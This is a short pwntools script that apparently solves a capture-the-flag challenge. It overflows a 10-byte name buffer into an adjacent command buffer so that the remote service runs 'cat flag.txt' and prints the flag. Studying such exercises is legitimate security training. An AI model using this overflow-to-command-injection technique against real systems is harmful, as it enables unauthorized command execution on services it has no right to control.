from pwn import *

hostname = ...
port = ...
p = remote(hostname, port)

p.recvuntil(b"name?")
p.recvline()

# stdin written into name (200 chars)
# c (10 chars) taken from cmd
# buffer (10 chars) taken from name
# buffer overflows into c
name = b"a"*10 + b"cat flag.txt\n"
p.sendline(name)

byeline = p.recvline()
flag = p.recvline()
print(flag)